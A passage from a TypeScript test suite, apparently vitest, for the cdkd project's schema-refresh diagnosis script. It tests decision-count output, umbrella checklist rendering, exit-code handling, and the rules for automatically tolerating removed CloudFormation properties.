      expect(saysClean, `count ${n} disagrees with the rendered verdict`).toBe(n === 0);
    }
  });
});

describe('--decision-count-out', () => {
  const SCRIPT = join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs');

  it('writes the count as a side effect of the run that rendered the report', () => {
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-count-'));
    try {
      const out = join(dir, 'count.txt');
      const md = execFileSync(
        'node',
        [SCRIPT, '--failed-checks', 'property-coverage,audit:sdk-attr-coverage:check',
         '--decision-count-out', out],
        { encoding: 'utf8' }
      );
      expect(readFileSync(out, 'utf8').trim()).toBe('2');
      // And the report it was written beside agrees.
      expect(md).toContain('### CI checks that FAILED (2) — a decision is needed');
      expect(md).not.toContain('Nothing in this refresh needs a decision');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  it('writes 0 on a clean refresh rather than omitting the file', () => {
    // An ABSENT file is what the workflow refuses to mark from, so "clean" has
    // to be a written zero. Omitting it here would make every clean cycle look
    // to the marking step like a broken run.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-count0-'));
    try {
      const out = join(dir, 'count.txt');
      execFileSync('node', [SCRIPT, '--decision-count-out', out], { encoding: 'utf8' });
      expect(readFileSync(out, 'utf8').trim()).toBe('0');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  it('refuses the flag with no value instead of leaving the count unwritten', () => {
    // Every other absent-input arm in this script is the permissive one, and
    // an unwritten count reads to the workflow as "no decisions needed".
    //
    // A flag with NO VALUE is an argv error, not a runtime one, so it takes
    // the same forgiving path every other argv guard here takes — the report
    // is replaced by the fallback sentence and the exit stays 0, because
    // failing would stop the PR from opening. The marking step's absent-count
    // refusal is what turns this into a red, one step later.
    const out = spawnSync('node', [SCRIPT, '--decision-count-out'], { encoding: 'utf8' });
    // The STATUS, not only the text — and NOT for the reason first written
    // here. Re-adding the flag to the re-throw set was measured and does not
    // survive: that arm writes to stderr, so the `toContain` below already
    // reds. What this catches is the arm that keeps the sentence on STDOUT and
    // sets `process.exitCode = 1` anyway — a shape the text assertion cannot
    // see at all, and one that stops the refresh PR from opening just as
    // surely, since the Diagnose step's exit is what Publish's implicit
    // `success()` reads.
    expect(out.status, 'an argv error now fails the step, so no PR opens').toBe(0);
    expect(out.stdout).toContain('--decision-count-out was given with no value');
  }, 60_000);

  it('is a known flag, so the unknown-flag guard does not refuse the workflow', () => {
    expect(KNOWN_FLAGS).toContain('--decision-count-out');
  });
});

describe('--umbrella-checklist returns before the refresh-report setup', () => {
  const SCRIPT = join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs');

  it('renders from an EMPTY fixtures directory, which the floor would refuse', () => {
    // The mode reads `property-coverage.generated.ts` and nothing else, but it
    // used to return further down — after `assertFixtureFloor` and after
    // `collectFixtureDeltas`, which shells out to `git show` per fixture. None
    // of that feeds the checklist and all of it can fail, which matters now
    // that `backfill-umbrella-sync.yml` runs this mode from a plain `main`
    // checkout with no refresh in front of it.
    //
    // An empty fixtures directory is the cheapest proof of the ordering: the
    // floor throws on it, so a render that still succeeds cannot have reached
    // the floor.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-umb-'));
    try {
      // The control: the same empty directory DOES stop the ordinary report.
      let refused = '';
      try {
        refused = execFileSync('node', [SCRIPT, '--fixtures-dir', dir], { encoding: 'utf8' });
      } catch (e) {
        refused = String((e as { stdout?: unknown }).stdout ?? '');
      }
      expect(refused, 'the fixture floor no longer refuses an empty directory').toContain(
        'failed to run'
      );

      const md = execFileSync('node', [SCRIPT, '--umbrella-checklist', '--fixtures-dir', dir], {
        encoding: 'utf8',
      });
      expect(md).toMatch(/^- \[ \] `AWS::/m);
      expect(md, 'the checklist mode fell through into the refresh report').not.toContain(
        'What changed, and what needs a decision'
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);
});

describe('a failure in a mode a WORKFLOW consumes exits non-zero', () => {
  const SCRIPT = join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs');
  const spawn = (args: string[]) =>
    spawnSync('node', [SCRIPT, ...args], { encoding: 'utf8' });

  it('keeps the forgiving fallback for the HUMAN report', () => {
    // The original reasoning stands where it was written: a broken diagnosis
    // must not stop the PR that describes it from being opened, because the PR
    // is how the human finds out anything at all.
    const out = spawn(['--fixtures-dir', join(REPO_ROOT, 'no-such-directory')]);
    expect(out.status).toBe(0);
    expect(out.stdout).toContain('The automated diagnosis failed to run');
  }, 60_000);

  it('KEEPS the report when the count cannot be written, and says so on stderr', () => {
    // `--decision-count-out` rides on the invocation that renders the PR BODY,
    // so exiting non-zero for it fails the Diagnose step — and Publish and Mark
    // carry plain `if:` conditions, which GitHub ANDs with an implicit
    // `success()`. A round of this branch did exactly that, and the result was
    // that an unwritable count path meant NO PR OPENED AT ALL, reversing the
    // job's own stated priority. Nothing is lost by being forgiving: the
    // marking step refuses an absent count rather than reading it as zero, so
    // the failure is still loud — it just reddens beside a PR that exists.
    const out = spawn(['--decision-count-out', '/nonexistent/dir/count.txt']);
    expect(out.status, 'a count-write failure stops the PR from opening').toBe(0);
    expect(out.stdout, 'the report was lost with the count').toContain(
      '## What changed, and what needs a decision'
    );
    expect(out.stderr).toContain('could not write the decision count');
  }, 60_000);

  it('does NOT extend it to --umbrella-checklist either', () => {
    // This one is the sharper of the two: the sync workflow redirects stdout
    // to a file, so a swallowed failure produced a NON-EMPTY file holding one
    // error sentence, which the splice would write into the umbrella in place
    // of the entire checklist — on a green run.
    const out = spawn(['--umbrella-checklist', '--umbrella-checklist']);
    expect(out.status, 'a broken checklist render reported success').not.toBe(0);
    expect(out.stdout, 'the error sentence would be spliced into the issue').toBe('');
    expect(out.stderr).toContain('diagnose-schema-refresh:');
  }, 60_000);

  it('the checklist mode still renders when it CAN, ignoring the report-only seam', () => {
    // The control for the two refusals above: the same mode, on the happy
    // path, still exits 0 and emits rows — and does so with a fixtures
    // directory that does not exist, which is what proves the early return
    // still sits above the fixture floor.
    const out = spawn(['--umbrella-checklist', '--fixtures-dir', '/nonexistent']);
    expect(out.status).toBe(0);
    expect(out.stdout).toMatch(/^- \[ \] `AWS::/m);
  }, 60_000);
});

describe('the finished-campaign sentinel', () => {
  const SCRIPT = join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs');

  it('is what makes "no rows left" distinguishable from a broken parse', () => {
    // `renderUmbrellaChecklist` throws only on zero type BOUNDARIES, so a
    // coverage map whose every `silentDrop` is empty is a legitimate empty
    // list. Emitting a bare newline for it made the sync workflow's
    // rows-or-nothing guard kill the step under `set -e` with no annotation,
    // and the umbrella kept its last stale rows permanently.
    expect(UMBRELLA_EMPTY_SENTINEL).toMatch(/^_No remaining silent-drop properties/);
    // ONE renderer emits this sentence again. go-to-k/cdkd#2949 briefly gave it
    // a second — the parent's per-type index — and go-to-k/cdkd#2998 deleted
    // that along with the whole parent-body splice, so the reconciler must not
    // carry a copy of the text OR an unused import of it.
    const reconciler = readFileSync(join(REPO_ROOT, 'scripts/sync-backfill-subissues.ts'), 'utf8');
    expect(
      reconciler.includes(UMBRELLA_EMPTY_SENTINEL),
      'the sentinel text was copied into the reconciler'
    ).toBe(false);
    expect(
      reconciler,
      'the reconciler imports the sentinel again — it renders no campaign-level text'
    ).not.toContain('UMBRELLA_EMPTY_SENTINEL');
  });

  it('renders rows on the real map, so the sentinel arm is not the live one', () => {
    // The control. A sentinel that fired in production would mean the campaign
    // had silently emptied, and every case above would be asserting about a
    // branch nothing takes.
    const out = spawnSync('node', [SCRIPT, '--umbrella-checklist'], { encoding: 'utf8' });
    expect(out.status).toBe(0);
    expect(out.stdout).toMatch(/^- \[ \] `AWS::/m);
    expect(out.stdout).not.toContain(UMBRELLA_EMPTY_SENTINEL);
  }, 60_000);
});

describe('renderUmbrellaDocument', () => {
  // A generated coverage module with a type BOUNDARY but nothing left to
  // backfill. `renderUmbrellaChecklist` throws only on zero boundaries, so
  // this shape is a legitimate empty list and not a broken parse — the
  // distinction the sync workflow's guard is built on.
  const FINISHED = `
export const PROPERTY_COVERAGE = new Map([
  ['AWS::S3::Bucket', {
    handled: new Set(['BucketName']),
    silentDrop: new Map<string, string>([]),
  }],
]);
`;
  const REMAINING = `
export const PROPERTY_COVERAGE = new Map([
  ['AWS::S3::Bucket', {
    handled: new Set(['BucketName']),
    silentDrop: new Map<string, string>([['ObjectLockConfiguration', 'x']]),
  }],
]);
`;

  it('says so when nothing is left, instead of emitting nothing', () => {
    // Emitting a bare empty string made the sync workflow's rows-or-sentinel
    // guard kill the step under `set -e` with no annotation, and the umbrella
    // kept its last stale rows permanently. This arm is unreachable through
    // the CLI — the real map always has rows — which is why the decision lives
    // in a function rather than inline in `main()`.
    expect(renderUmbrellaChecklist(FINISHED)).toEqual([]);
    expect(renderUmbrellaDocument(FINISHED)).toBe(UMBRELLA_EMPTY_SENTINEL);
  });

  it('emits the rows, and only the rows, when there are some', () => {
    expect(renderUmbrellaDocument(REMAINING)).toBe(
      '- [ ] `AWS::S3::Bucket`: `ObjectLockConfiguration`'
    );
    expect(renderUmbrellaDocument(REMAINING)).not.toContain(UMBRELLA_EMPTY_SENTINEL);
  });
});

/**
 * The offline classifier and the automatic tolerance write (issue #2774).
 *
 * `renderDiagnosis`'s own reasoning is why these two are fenced harder than the
 * rest of the module: the silencing option is always available and always turns
 * CI green, so a rule that chooses automatically under uncertainty converges on
 * it and disables the check that caught the problem. What makes the automatic
 * answer defensible is that it is not a judgement at all — two structural facts,
 * both read from the checkout. So every case below asserts WHICH clause decided,
 * not merely that a decision was reached, and the auto arm is only ever entered
 * from real repo data.
 */

const ROUTE53_PROVIDER = 'src/provisioning/providers/route53-provider.ts';
const APIGW_PROVIDER = 'src/provisioning/providers/apigateway-provider.ts';
const NESTED_STACK_PROVIDER = 'src/provisioning/providers/nested-stack-provider.ts';
const SQS_PROVIDER = 'src/provisioning/providers/sqs-queue-provider.ts';
const ASG_PROVIDER = 'src/provisioning/providers/asg-provider.ts';

/** The two real evidence readers, so no case can pass against a stub. */
const EVIDENCE = {
  typedMember: typedSdkMember,
  wires: providerWiresProperty,
  repoRoot: REPO_ROOT,
} as const;

describe('classifyRemovedProperty', () => {
  it('settles the case the feature was built for, and says WHY in the rationale', () => {
    // `AWS::Route53::RecordSet.GeoProximityLocation`: AWS dropped it from the
    // CFn schema while `@aws-sdk/client-route-53` still declares it and the
    // provider still reads it off the template. Both facts hold, so "keep
    // sending it" is the only answer either fact permits.
    const verdict = classifyRemovedProperty({
      property: 'GeoProximityLocation',
      client: '@aws-sdk/client-route-53',
      providerRelPath: ROUTE53_PROVIDER,
      renameCandidates: [],
      ...EVIDENCE,
    });
    expect(verdict.auto, JSON.stringify(verdict)).toBe(true);
    const rationale = (verdict as { rationale: string }).rationale;
    // The rationale is what a human audits the automatic write BY, so it has to
    // carry both facts and where each was read — not a template sentence.
    expect(rationale).toContain('@aws-sdk/client-route-53');
    expect(rationale).toContain('ResourceRecordSet');
    expect(rationale).toMatch(/wires it at src\/provisioning\/providers\/route53-provider\.ts:\d+/);
    expect(rationale).toContain('Written automatically by the schema refresh job');
    // PascalCase here, so the camelCase note must NOT appear — it is a claim
    // about the service's modelling convention, wrong on this one.
    expect(rationale).not.toContain('camelCase');
  });

  it('names the lower-initial spelling when that is what the evidence was', () => {
    // `@aws-sdk/client-api-gateway` models `stageName`, so the member was found
    // under the lowerFirst spelling. Saying so is the difference between a
    // rationale a reader can re-derive and one they have to take on trust.
    const verdict = classifyRemovedProperty({
      property: 'StageName',
      client: '@aws-sdk/client-api-gateway',
      providerRelPath: APIGW_PROVIDER,
      renameCandidates: [],
      ...EVIDENCE,
    });
    expect(verdict.auto, JSON.stringify(verdict)).toBe(true);
    // The note used to call the spelling "camelCase, the SDK convention for
    // this service", which is a claim about the SERVICE's modelling that the
    // evidence never established — the walk found one spelling, not a
    // convention. The replacement states only what was read.
    expect((verdict as { rationale: string }).rationale).toContain(
      '(under its lower-initial spelling, which several services use)'
    );
    expect((verdict as { rationale: string }).rationale).not.toContain('camelCase');
  });

  it('refuses a rename candidate even when BOTH facts hold', () => {
    // The clause that cannot be argued out of: a rename is a removal plus an
    // addition, and the SDK keeps the OLD name for compatibility — so the
    // evidence is fully satisfied for a property whose correct fix is
    // repointing the declaration. Tolerating it would mark the PR "no decision
    // needed" and bury the new name.
    const input = {
      property: 'GeoProximityLocation',
      client: '@aws-sdk/client-route-53',
      providerRelPath: ROUTE53_PROVIDER,
      ...EVIDENCE,
    };
    const refused = classifyRemovedProperty({
      ...input,
      renameCandidates: ['GeoProximity', 'GeoProximityLocationV2'],
    });
    expect(refused.auto).toBe(false);
    const reason = (refused as { reason: string }).reason;
    expect(reason).toContain('`GeoProximity`');
    expect(reason).toContain('`GeoProximityLocationV2`');
    expect(reason).toContain('RENAME');
    // The control that isolates the guard: the SAME input with an empty
    // candidate list is the auto arm, so the refusal above is the rename clause
    // and not the evidence failing to load.
    expect(classifyRemovedProperty({ ...input, renameCandidates: [] }).auto).toBe(true);
  });

  it('refuses when the type\'s own SDK client could not be determined', () => {
    // `clientsForType` deliberately reports `matched: false` rather than
    // guessing, and this is the arm that consumes that: with no client there is
    // no question to ask, which is different from having asked and got no.
    const verdict = classifyRemovedProperty({
      property: 'GeoProximityLocation',
      client: undefined,
      providerRelPath: ROUTE53_PROVIDER,
      renameCandidates: [],
      ...EVIDENCE,
    });
    expect(verdict.auto).toBe(false);
    expect((verdict as { reason: string }).reason).toContain(
      "could not determine this type's own SDK client"
    );
  });

  it('refuses when the client declares no member of the name', () => {
    // Retiring the declaration then IS a behaviour change — the field stops
    // being sent — and that stays a human's call. The reason names the client
    // so the reader knows which typings were walked.
    const verdict = classifyRemovedProperty({
      property: 'CdkdNotAMemberName',
      client: '@aws-sdk/client-route-53',
      providerRelPath: ROUTE53_PROVIDER,
      renameCandidates: [],
      ...EVIDENCE,
    });
    expect(verdict.auto).toBe(false);
    expect((verdict as { reason: string }).reason).toContain(
      '`@aws-sdk/client-route-53` declares no member of this name'
    );
  });

  it('refuses when no template read was found, WITHOUT calling it a cleanup', () => {
    // INVERTED from the case that used to live here, and the inversion is the
    // whole point rather than a reword. This arm used to conclude "the provider
    // names it in a declaration list but wires it nowhere, so removing the
    // declaration changes no behaviour — that is a cleanup, not a tolerance",
    // and that conclusion was measured WRONG on both verdicts the tree could
    // produce: `providerWiresProperty` sees only `properties['X']`, and
    // table-driven delivery is invisible to it. The runbook built on the old
    // wording told a maintainer to delete a declaration for a property cdkd
    // genuinely sends — the silent-drop class this whole job exists to watch,
    // reached through the job's own advice.
    //
    // `AWS::CloudFormation::Stack.TemplateURL` still reaches the arm the same
    // way: `@aws-sdk/client-cloudformation` declares the member, so the third
    // clause passes, and `nested-stack-provider.ts` names it in a declaration
    // list with no template read.
    expect(
      typedSdkMember('TemplateURL', '@aws-sdk/client-cloudformation', REPO_ROOT),
      'the SDK no longer declares it, so this case would exercise the THIRD arm'
    ).toBeDefined();
    const verdict = classifyRemovedProperty({
      property: 'TemplateURL',
      client: '@aws-sdk/client-cloudformation',
      providerRelPath: NESTED_STACK_PROVIDER,
      renameCandidates: [],
      ...EVIDENCE,
    });
    expect(verdict.auto).toBe(false);
    const reason = (verdict as { reason: string }).reason;
    expect(reason).toContain('COULD NOT DETERMINE');
    expect(reason, 'the reason no longer says what it failed to find').toContain(
      '`properties[...]` read'
    );
    // The retired claims, each asserted absent by name: a reader must not be
    // told the property is unused, nor that deleting it is free.
    expect(reason, 'the retired "wires it nowhere" conclusion is back').not.toContain(
      'wires it nowhere'
    );
    expect(reason, 'the retired "cleanup" verdict is back').not.toContain('cleanup');
    expect(reason, 'the retired "changes no behaviour" claim is back').not.toContain(
      'changes no behaviour'
    );
  });

  it('refuses the real property whose wiring the check cannot see', () => {
    // `AWS::SQS::Queue.DelaySeconds` is why the arm above had to be inverted,
    // and it is a live property rather than a constructed one:
    // `sqs-queue-provider.ts` delivers it through `CDK_TO_SQS_ATTRIBUTES`, a
    // shorthand-keyed lookup iterated as `properties[cdkKey]`, so no literal
    // `properties['DelaySeconds']` exists and the wiring reader reports
    // nothing. Under the old wording the job would have told a maintainer this
    // declaration was dead weight.
    expect(
      typedSdkMember('DelaySeconds', '@aws-sdk/client-sqs', REPO_ROOT),
      'the SDK no longer declares it, so this case would stop at the THIRD arm'
    ).toBeDefined();
    expect(
      providerWiresProperty('DelaySeconds', SQS_PROVIDER, REPO_ROOT),
      'the provider now reads it by literal, so this case no longer shows invisible wiring'
    ).toBe(undefined);
    const verdict = classifyRemovedProperty({
      property: 'DelaySeconds',
      client: '@aws-sdk/client-sqs',
      providerRelPath: SQS_PROVIDER,
      renameCandidates: [],
      ...EVIDENCE,
    });
    expect(verdict.auto, JSON.stringify(verdict)).toBe(false);
    const reason = (verdict as { reason: string }).reason;
    expect(reason).toContain('COULD NOT DETERMINE');
    // The reason NAMES this case, so the next reader of a refusal has the
    // counter-example in front of them rather than in a commit message.
    expect(reason).toContain('AWS::SQS::Queue');
    expect(reason).toContain('DelaySeconds');
  });

  it('refuses a member that only a RESPONSE model declares', () => {
    // `AWS::ApiGateway::Method.MethodResponses` was AUTO-SETTLED before the
    // evidence was narrowed: the name matches `Method`, which
    // `@aws-sdk/client-api-gateway` only ever returns, and the rationale
    // written from it asserted "the value still reaches AWS" about a shape cdkd
    // can never send. The refusal now comes from the SDK arm, one clause
    // earlier than the wiring arm, so the reason names the client.
    const verdict = classifyRemovedProperty({
      property: 'MethodResponses',
      client: '@aws-sdk/client-api-gateway',
      providerRelPath: APIGW_PROVIDER,
      renameCandidates: [],
      ...EVIDENCE,
    });
    expect(verdict.auto, JSON.stringify(verdict)).toBe(false);
    expect((verdict as { reason: string }).reason).toContain(
      '`@aws-sdk/client-api-gateway` declares no member of this name'
    );
    // The control that makes this the REACHABILITY test and not an ordinary
    // miss: the same client, the same provider, a name an operation input does
    // reach — that one settles.
    expect(
      classifyRemovedProperty({
        property: 'StageName',
        client: '@aws-sdk/client-api-gateway',
        providerRelPath: APIGW_PROVIDER,
        renameCandidates: [],
        ...EVIDENCE,
      }).auto
    ).toBe(true);
  });

  it('refuses a rename split across two cycles, seen only in the CURRENT schema', () => {
    // `renameCandidates` carries what THIS refresh added, and at a daily cadence
    // a rename usually does not land as one delta: AWS adds the new name on one
    // day and drops the old one on another, so the removal arrives with an
    // empty candidate list and the strongest refusal disarms itself. The second
    // source is names ALREADY in the type's schema.
    const input = {
      property: 'GeoProximityLocation',
      client: '@aws-sdk/client-route-53',
      providerRelPath: ROUTE53_PROVIDER,
      renameCandidates: [],
      ...EVIDENCE,
    };
    // The control FIRST, because it is what makes the refusal attributable:
    // with both sources empty this exact input is the AUTO arm, so the only
    // thing changing below is the cross-cycle candidate.
    expect(classifyRemovedProperty(input).auto).toBe(true);
    const refused = classifyRemovedProperty({
      ...input,
      schemaRenameCandidates: ['GeoProximity'],
    });
    expect(refused.auto, JSON.stringify(refused)).toBe(false);
    const reason = (refused as { reason: string }).reason;
    expect(reason).toContain('`GeoProximity`');
    expect(reason).toContain('RENAME');
    // The wording had to move with the source: "this refresh also ADDED …" is
    // false about a name that has been on the type for cycles.
    expect(reason, 'the reason still claims THIS refresh added the pair').not.toContain(
      'this refresh also ADDED'
    );
    expect(reason).toContain('on the same type');
  });
});

describe('writeAutoTolerated', () => {
  // The evidence helpers are loaded ON DEMAND now (issue go-to-k/cdkd#2858), so the
  // cases below that exercise the REAL `typedSdkMember` / `providerWiresProperty`
  // have to ask for them; the CLI does the same before `main()`. Cases that
  // inject doubles never reach the loader.
  beforeAll(async () => {
    await loadEvidenceDeps();
  });

  it('declares every runtime export in the .d.mts, and nothing else', () => {
    // The declaration file is a SECOND COPY of the module's surface and nothing
    // compared them, so an export could ship undeclared — measured: two had
    // (`knownFlagFor`, `loadDeclaredPropertiesSource`). A TS consumer then gets
    // "has no exported member" for a function that exists, and the file's
    // config-less `tsc` check cannot see the gap because it only asks whether
    // the declarations are self-consistent.
    //
    // Both directions: a declaration with no export is the more dangerous half,
    // since it type-checks at every call site and fails at runtime.
    //
    // BOUND, stated because the first cut of this comment read as if drift were
    // closed and it is NOT: this compares NAMES. A declaration whose SIGNATURE
    // drifted passes — measured in the same commit that added this fence, where
    // `classifyArgs` had grown a third return bucket the declaration did not
    // name. And NEITHER pattern sees `let` / `var` / `namespace` / `interface` /
    // `type` / `default`, nor `export { x }`: on the runtime side that ships an
    // export undeclared, and on the declared side it is a FALSE RED, since the
    // name has no runtime counterpart for the scan to pair it with.
    const mjs = readFileSync(join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs'), 'utf8');
    const dmts = readFileSync(join(REPO_ROOT, 'scripts/diagnose-schema-refresh.d.mts'), 'utf8');
    const names = (src: string, re: RegExp): string[] =>
      [...src.matchAll(re)].map((m) => m[1]!).sort();

    const exported = names(mjs, /^export (?:const|function|async function|class) (\w+)/gm);
    // `class` on BOTH sides: the runtime pattern matched it and the declared one
    // did not, so the first `export class` added here would have been a
    // permanent false red. `async function` is deliberately absent from the
    // declared alternation — TS forbids `declare async function`.
    const declared = names(dmts, /^export declare (?:const|function|class) (\w+)/gm);
    expect(exported).toEqual(declared);
    // Non-vacuity: both scans must have matched something, or two empty lists
    // compare equal and the fence asserts nothing.
    expect(exported.length).toBeGreaterThan(20);
  });

  it('declares every bucket classifyArgs actually returns', () => {
    // The name-only fence above cannot see a SIGNATURE drift, and one shipped:
    // `classifyArgs` grew a third return bucket while its declaration still
    // named two, so a TS consumer destructuring `valued` got "Property does not
    // exist" for a property that is there. Reverting the declaration produces
    // ZERO type errors — measured — because nothing compares the two.
    //
    // Scoped to this one function rather than to the whole surface: it is the
    // drift that actually happened, and a runtime key set is a fact the
    // declaration cannot restate. `typeof import(...)` is no use here — it
    // resolves to the DECLARATION, so it would compare the file with itself.
    const dmts = readFileSync(join(REPO_ROOT, 'scripts/diagnose-schema-refresh.d.mts'), 'utf8');
    // `[^}]*`, not `[\s\S]*?`: the lazy form binds THROUGH a reformatted
    // declaration to a later type's `\n};` and collects ITS members — measured,
    // 13 unrelated names. The case still failed, but named the wrong thing;
    // this form yields NO MATCH there, which is the message the reader needs.
    const block = /export declare function classifyArgs\([^)]*\): \{([^}]*)\n\};/.exec(dmts);
    expect(block, 'classifyArgs is no longer declared as an inline object return').not.toBeNull();
    // `\??` so an OPTIONAL member counts: without it an over-declared
    // `valued?: string[]` passes silently — the same drift one modifier over.
    const declared = [...block![1]!.matchAll(/^\s{2}(\w+)\??:/gm)].map((m) => m[1]!).sort();
    expect(declared.length, 'the member scan found nothing to compare').toBeGreaterThan(0);
    expect(Object.keys(classifyArgs([])).sort()).toEqual(declared);
  });

  it('loads the evidence helpers ONCE', () => {
    // Asserted in the loader's docblock and by nothing else: deleting the
    // memoization guard reds no other case, and ESM module caching does not
    // rescue it — the loader builds a FRESH object literal each call, so a
    // second run returns a different one.
    //
    // It lives here rather than beside the no-deps cases because those depend
    // on the module NOT having loaded, and a case that loads would make that
    // ordering load-bearing — measured: with one there, two shuffle seeds
    // failed the unloaded-refusal case. This file loads in `beforeAll` anyway.
    return Promise.all([loadEvidenceDeps(), loadEvidenceDeps()]).then(([a, b]) => {
      expect(b).toBe(a);
    });
  });

  /**
   * A scratch repo root the call may WRITE into.
   *
   * `writeAutoTolerated` rewrites `tests/fixtures/cfn-schemas/_todo-backfill.json`
   * in place, and that file is COMMITTED — a case pointed at the real root would
   * silently edit a tolerance file whose entries are human rationales. So the
   * only real thing borrowed is `node_modules` (symlinked, read-only: the SDK
   * typings are the input these cases exist to read) and the provider sources
   * (copied). Everything the call writes lands under the scratch root, and the
   * committed file's bytes are asserted UNCHANGED around every case, so the
   * protection cannot rot into a comment.
   */
  const withScratchRoot = (
    seed: Record<string, unknown>,
    run: (root: string, backfill: string) => void
  ): void => {
    const committed = join(REPO_ROOT, 'tests/fixtures/cfn-schemas/_todo-backfill.json');
    const before = readFileSync(committed);
    const root = mkdtempSync(join(tmpdir(), 'cdkd-auto-tolerated-'));
    try {
      mkdirSync(join(root, 'tests/fixtures/cfn-schemas'), { recursive: true });
      mkdirSync(join(root, 'src/provisioning/providers'), { recursive: true });
      symlinkSync(join(REPO_ROOT, 'node_modules'), join(root, 'node_modules'));
      for (const rel of [ROUTE53_PROVIDER, APIGW_PROVIDER, NESTED_STACK_PROVIDER, ASG_PROVIDER]) {
        cpSync(join(REPO_ROOT, rel), join(root, rel));
      }
      const backfill = join(root, 'tests/fixtures/cfn-schemas/_todo-backfill.json');
      writeFileSync(backfill, `${JSON.stringify(seed, null, 2)}\n`);
      run(root, backfill);
    } finally {
      rmSync(root, { recursive: true, force: true });
      expect(
        readFileSync(committed).equals(before),
        'the case wrote to the COMMITTED tolerance file'
      ).toBe(true);
    }
  };

  const PROVIDER_FILES = new Map([
    ['AWS::Route53::RecordSet', ROUTE53_PROVIDER],
    ['AWS::ApiGateway::Deployment', APIGW_PROVIDER],
    ['AWS::CloudFormation::Stack', NESTED_STACK_PROVIDER],
  ]);

  it('writes the settled ones and escalates the rest, in one pass', () => {
    withScratchRoot({ types: {} }, (root, backfill) => {
      const result = writeAutoTolerated(
        [
          {
            resourceType: 'AWS::Route53::RecordSet',
            properties: ['GeoProximityLocation', 'CdkdNotAMemberName'],
            candidates: {},
          },
          {
            resourceType: 'AWS::ApiGateway::Deployment',
            properties: ['StageName'],
            candidates: {},
          },
        ],
        PROVIDER_FILES,
        root
      );

      expect(result.written.map((w) => `${w.resourceType}.${w.property}`)).toEqual([
        'AWS::Route53::RecordSet.GeoProximityLocation',
        'AWS::ApiGateway::Deployment.StageName',
      ]);
      expect(result.escalated.map((e) => `${e.resourceType}.${e.property}`)).toEqual([
        'AWS::Route53::RecordSet.CdkdNotAMemberName',
      ]);
      expect(result.escalated[0]!.reason).toContain('declares no member of this name');

      // The write is the deliverable, not the return value: the next cycle
      // reads this file, and a `bogusTolerated` block absent from the seed has
      // to be created rather than dropped.
      const doc = JSON.parse(readFileSync(backfill, 'utf8'));
      expect(doc.bogusTolerated['AWS::Route53::RecordSet'].GeoProximityLocation).toBe(
        result.written[0]!.rationale
      );
      expect(doc.bogusTolerated['AWS::ApiGateway::Deployment'].StageName).toBe(
        result.written[1]!.rationale
      );
      // The pre-existing content survives, and the shape is the one the
      // generator already writes — 2-space indent, trailing newline — so a
      // cycle that settles nothing produces no diff noise.
      expect(doc.types).toEqual({});
      const text = readFileSync(backfill, 'utf8');
      expect(text.endsWith('}\n')).toBe(true);
      expect(text).toContain('\n  "bogusTolerated": {');
    });
  }, 60_000);

  it('NEVER overwrites an entry a human already wrote', () => {
    // A rationale already there was written by a person about the same
    // property, and the automatic one would replace a considered sentence with
    // a template. The property is one that WOULD otherwise be settled, so the
    // case is about the skip and not about the evidence failing.
    const HUMAN = 'CFn spells the same field differently; see the umbrella issue.';
    withScratchRoot(
      { bogusTolerated: { 'AWS::Route53::RecordSet': { GeoProximityLocation: HUMAN } } },
      (root, backfill) => {
        const before = readFileSync(backfill);
        const result = writeAutoTolerated(
          [
            {
              resourceType: 'AWS::Route53::RecordSet',
              properties: ['GeoProximityLocation'],
              candidates: {},
            },
          ],
          PROVIDER_FILES,
          root
        );
        // Skipped outright — neither written nor escalated. Escalating it would
        // put a settled decision back in front of a human every cycle.
        expect(result).toEqual({ written: [], escalated: [] });
        expect(readFileSync(backfill).equals(before)).toBe(true);
        expect(JSON.parse(readFileSync(backfill, 'utf8')).bogusTolerated[
          'AWS::Route53::RecordSet'
        ].GeoProximityLocation).toBe(HUMAN);
      }
    );
  }, 60_000);

  it('does not touch the file at all when nothing was settled', () => {
    // Byte-identity is the visible half; the mtime is the stronger claim — the
    // file was not REWRITTEN with identical content, which on a daily job is
    // the difference between a clean tree and a commit every morning.
    withScratchRoot({ types: {}, bogusTolerated: {} }, (root, backfill) => {
      const before = readFileSync(backfill);
      const stamp = statSync(backfill).mtimeMs;
      const result = writeAutoTolerated(
        [
          {
            resourceType: 'AWS::Route53::RecordSet',
            properties: ['CdkdNotAMemberName'],
            candidates: {},
          },
          {
            resourceType: 'AWS::CloudFormation::Stack',
            properties: ['TemplateURL'],
            candidates: {},
          },
        ],
        PROVIDER_FILES,
        root
      );
      expect(result.written).toEqual([]);
      expect(result.escalated).toHaveLength(2);
      // `nested-stack-provider.ts` imports no `@aws-sdk/client-*`, so its type
      // reaches the second clause — the real instance of "nothing to ask".
      expect(result.escalated[1]!.reason).toContain(
        "could not determine this type's own SDK client"
      );
      expect(readFileSync(backfill).equals(before)).toBe(true);
      expect(statSync(backfill).mtimeMs, 'the file was rewritten with identical bytes').toBe(stamp);
    });
  }, 60_000);

  it('escalates a rename candidate carried on the entry', () => {
    // The clause is reached through `entry.renameCandidates[property]`, which is
    // a per-PROPERTY map on the entry — a plumbing step of its own, and the one
    // place a wrong key would silently disarm the strongest refusal.
    withScratchRoot({ bogusTolerated: {} }, (root, backfill) => {
      const before = readFileSync(backfill);
      const result = writeAutoTolerated(
        [
          {
            resourceType: 'AWS::Route53::RecordSet',
            properties: ['GeoProximityLocation'],
            candidates: {},
            renameCandidates: { GeoProximityLocation: ['GeoProximity'] },
          },
        ],
        PROVIDER_FILES,
        root
      );
      expect(result.written).toEqual([]);
      expect(result.escalated[0]!.reason).toContain('RENAME');
      expect(readFileSync(backfill).equals(before)).toBe(true);
    });
  }, 60_000);

  it('escalates a property with no template read as COULD NOT DETERMINE', () => {
    // The fourth clause needs a type whose client RESOLVES and whose provider
    // only names the property — a pair the real tree does not offer
    // (`nested-stack-provider.ts` is the unwired one, and it imports no client
    // at all, so it stops at the second clause). A synthetic provider under the
    // scratch root is the honest instrument: it imports the REAL route-53
    // client, so the SDK half is measured, and names the property exactly the
